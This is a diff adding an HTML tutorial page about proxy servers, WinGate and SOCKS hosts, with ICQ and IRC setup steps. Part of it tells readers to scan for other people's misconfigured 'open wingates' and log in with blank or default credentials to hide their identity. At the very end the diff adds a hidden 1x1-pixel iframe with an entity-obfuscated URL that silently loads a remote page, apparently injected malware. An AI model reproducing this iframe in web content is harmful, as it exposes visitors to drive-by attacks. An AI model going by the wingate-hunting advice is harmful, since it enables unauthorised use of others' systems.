@@ -1,0 +1,158 @@
+<html>
+<head>
+<title>Proxy / WinGate / SOCKS Tutorial</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlink="#ffffff">
+<div align="center">
+<table width="680" border="0" cellspacing="2" cellpadding="2">
+  <tr>
+    <td width="693">
+      <pre>
+                        :::::::::   ::::::::  :::::::::  ::::::::::
+                        :+:    :+: :+:    :+: :+:    :+: :+:
+                        +:+    +:+ +:+        +:+    +:+ +:+
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#
+                        +#+    +#+        +#+ +#+    +#+ +#+
+                        #+#    #+# #+#    #+# #+#    #+# #+#
+                        #########   ########  ###    ### ###
+
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I   <b>Proxy / WinGate / SOCKS</b>   I   Written by:     /
+    &gt;                     I                             I                  &lt;
+   /      <a href="mailto:black_mesa@hacktik.org">Martin L.</a>       I_____________________________I   <a href="mailto:uslijatt@hotmail.com">Jatt</a>            \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+</div>
+<h3>What is a Proxy Server?</h3>
+<p>Proxy Server is a server that someone (maybe an ISP, maybe a friend) has setup so that when you go to connect to a
+website, instead of going directly to the site's server, it will take a detour and 1st go through the proxy server and then
+from the proxy server go to the website. Well, actually, the proxy server first downloads the data for you and then sends
+it over. So if someone else loads the website and is also going through the same network they will just get the website
+off of the Proxy Server. Whoever (most likely a System Admin, ISP, etc.)  is managing this server will be in charge of
+setting up the time in which the proxy server refreshes the websites. Everytime a new page is visited, it is saved on the
+Proxy Server.  Again, its up to the person in charge of the Proxy Server to choose how long the site stays on the server.
+If a user notices that a site is not updated and needs to be refreshed (such as a site that is supposed to be updated daily)
+all he or she has to do is hit the "refresh or reload" button on their browsers and it will update the page on the proxy server.</p>
+<h3>Why use a Proxy Server?</h3>
+<p>There are different reasons.  Some ISP's (Internet Service Providers) like it because it cuts down on overall traffic for
+their network, and speeds up surfing for their users (since the Proxy is closer to them than the site's server, they get less
+"trip time", less lag or in other words, faster surfing). Users like it because it can help to make it harder to track their
+activities over the web. This is especially useful since Users can actually chain some proxies and actually go through 3 or
+more different proxy servers; however it will be hard to find 3 servers that will allow it for one thing. For Another, The
+speed of the connection will become noticeably slower, especially if we're dealing with servers on different continents.
+Another reason is if you connect to a larger proxy server, your speed will increase.  Note: It's a good thing to find out
+who runs the proxy server you are connecting through. If its Microsoft don't bother, they'll probably log your every move.
+If it's anonymous or if it's one that says anyone in the public can use, then go for it.  To find out this info you would
+usually have to check with the proxy server's admin's website.</p>
+<h3>What is a Wingate?</h3>
+<p>AN Official definition I've heard from a few people is:</p>
+<p>"WinGate is a proxy server firewall software package that allows you to share a single (or multiple) Internet connections
+with an entire computer network. The Internet connection shared by WinGate can be of nearly any type, including dial up
+modem, ISDN, xDSL, cable modem, satellite connection, or even dedicated T1 circuits."</p>
+<p>Wingate is similar to a proxy server. It connects different computer through port 23 onto a server, which is called a
+wingate. In fact, it's just a telnet connection.  The Wingate will let anyone on the network access the Internet or connect
+through it to other sites. Due to poorly configured wingates and Administrator's incompetence, there's a lot of wingates
+that will let anyone on the Internet connect through them, instead of limiting access to people from the local network.
+Opening the way for anything from an IP spoof on ICQ or irc to full scale abuse. Such wingates are called "Open Wingates"
+and usually last from anywhere from a few days to maybe a few months until an Administrator either discovers it or gets
+complaints about some "mysterious" users doing something they shouldn't be.  Most likely in that case it's someone connecting
+over the Internet.</p>
+<p>The only benefit for administrators is the ability to put multiple users through the same connection. The problems
+with it clearly outweigh the benefits. If anyone is going to set up their own wingate, I'd suggest strongly that you know
+what you are doing and make sure that is configured securely so that only those that are meant to use it, are the ones
+using it. Another more secure WinGate-like software is SyGate.</p>
+<p>&gt;From previous experience working with Wingates both as a Network Administrator and a "remote" user I can tell you
+that the logs on most wingates are cleared usually every 48 hours.  Most businesses and ISP's (especially the big ones)
+just don't have the need or the resources to log every single thing that happens on their wingate servers.</p>
+<h3>How do I find Wingates?</h3>
+<p>Good question. The best way is word of mouth.  Failing that, the 2nd best way is to use a wingate scanner. You can
+scan whole subnets for wingates. A note: IP's in third world countries, the Middle East (except Israel), Africa, and on
+the @home network all have one thing in common: They all have wingates that are poorly configured and there are usually
+a few open wingates on their networks.  Try scanning them 1st and foremost.  Through Unix, the best way is: trial and
+error. telnet to the wingate through port 23, then leave the user name and password blank and if you get in, you've
+found one.  You might also want to try username and/or password as: wingate.  The best windows (32 bit) scanner
+I have used is:  wGateScan v2.2</p>
+<p>It is available on many different websites. I got it from this site, it has some other useful stuff on it too:
+<a href="http://www.hotmanscave.com/" target="_blank">http://www.hotmanscave.com/</a></p>
+<p>To use it, all you have to do is to enter a range of IP address or a hostname. It will telnet to each host in the
+range through port 23 and will send a message saying "wingate" or something. If the host accepts this message then bingo
+! You've found one and it keeps a list of all working open wingates, which you can save to a file or delete as needed.</p>
+<h3>Wingates with ICQ:</h3>
+<p>To Configure ICQ to work with WinGate:<br>
+Go to WinGate Setup Screen and click on the Proxies Tab<br>
+Press ADD<br>
+Select Type of Proxy: 'Mapped Link'<br>
+Press Create<br>
+Under the Settings Group check 'Enable Connections To Proxy On Port.' Put the number 3333 in this window.<br>
+Set The Socket Type to: 'UDP'<br>
+Make sure that 'Destroy Inactive Sessions after XXX seconds' is NOT Checked.<br>
+Make sure that 'Enable Default Remote Host' is Checked and set to: icq.mirabilis.com Port: 4000<br>
+For each remote machine:<br>
+Press Add.<br>
+In 'Connect Client IP' enter the IP of the remote machine<br>
+In 'To Host' enter icq.mirabilis.com<br>
+In 'Port' enter 4000<br>
+Press OK<br>
+Now press DONE.<br>
+You will now be at the main WinGate setup screen.<br>
+Make sure that there is a SOCKS4 Proxy Enabled on Port 1080<br>
+Press SAVE<br>
+Check it out at your remote machine<br>
+Remote Machine Configuration<br>
+If you still did not pass the ICQ Registration Wizard:<br>
+At the Registration Wizard under Connection Type register as a LAN User.<br>
+Choose 'I am behind a firewall or proxy.'<br>
+Click Next for the next dialog.<br>
+Choose either Socks4 or socks 5 server depending on the compatibility of the proxy server<br>
+Do NOT mark the firewall sessions time out<br>
+click Next for the next dialog.<br>
+Enter the servers' IP address using socks port 1080.<br>
+Click Next for the next to see if you have succeeded to register.<br>
+If you fail to register, you will receive the a dialog telling you so.<br>
+Try one or more of the following:<br>
+Click Retry to try again using the same settings.<br>
+Hit the Back button to change the firewall settings.<br>
+Click Cancel to abort. Reconfigure your firewall settings and try again by running ICQ.exe.<br>
+Additional Remote Machines:</p>
+<p>For any additional Remote Machines on your network, Do exactly the same procedure as specified in Remote Machine.
+Use EXACTLY the same numbers and setup. You only have to look up the IP address of the Host one time on any one of the
+remote machines in its HOSTS file.</p>
+<h3>Wingates with IRC:</h3>
+<p>To configure your IRC client to use a Wingate, simply tell it that you're behind a SOCKS4 or SOCKS5 (again, depending
+on the Wingate. Try both and see which one of them work) and enter the Wingate's IP. If you are asked for a username and
+a password, leave these fields blank. Since there are so many IRC clients out there, I won't explain further and let you
+explore your own client by yourself.</p>
+<h3>What is a Socks Host?</h3>
+<p>Socks host is pretty much almost the same thing as wingate except it connects through port 1080. In your settings
+for proxy server in your internet browser (explorer or Netscape) you should notice a setting for socks host.  You can
+enter a socks host. If you have ever used mIRC for IRC, you'll notice a setting for firewall.  In that setting leave
+the username and password blank, leave the port as 1080 and enter a wingate address in the Hostname, then click Use Socks
+firewall, and try either protocol: Socks4 or Socks5 (whichever works for you).  Reconnect and you should notice that your
+IP address and identify will appear on IRC as if you are connecting through the same IP address as the socks host. Not all
+wingates will work as a socks host. Remember it has to be able to let you connect through port 1080 or else its no use in
+irc.  Newer IRC daemons can however detect wingate/socks host connections. With the web, it's not useful. It may or may not
+hide your IP address depending the type of websites you are connecting to.  For web anonymity stick to multiple Proxy servers.</p>
+<h3>Bottom Line:</h3>
+<p>Socks/Wingates and Proxies can hide your identity or make it harder to detect and log on the Internet, and it may even be
+legal to do so in 90% of cases but try not to over do it by thinking that "I'll never get caught" by going through multiple
+proxy servers, wingates, or socks hosts.  Remember anyone can be traced back to their original IP address and their ISP. All
+it takes is a little co-operation with different Proxy server administrators, ISP's and a few law enforcement agencies working together.</p>
+<hr width="50%" align="left">
+<p>That's it for the Socks Host / Proxy Server and Wingate Tutorial. Questions or Comments should be forwarded to <a href="mailto:uslijatt@hotmail.com">uslijatt@hotmail.com</a></p>
+<p>&nbsp;</p>
+<p>Jatt</p>
+<p>&nbsp;</p>
+<p>For more info on Proxies and a big list of Proxy servers, wingates, telnet, ftp, and socks hosts try: <a href="http://proxys4all.cgi.net/" target="_blank">http://proxys4all.cgi.net/</a></p>
+<p><b>-note:</b> not all are tested and some might have been shutdown by their administrators. Also the lists are not updated as often as most people would like.<br>
+Another Wingate proxy tutorial:  <a href="http://www.wingate.net/" target="_blank">http://www.wingate.net/</a><br>
+ICQ with wingate:  <a href="http://www.visions.demon.nl/wingate/" target="_blank">http://www.visions.demon.nl/wingate/</a></p>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
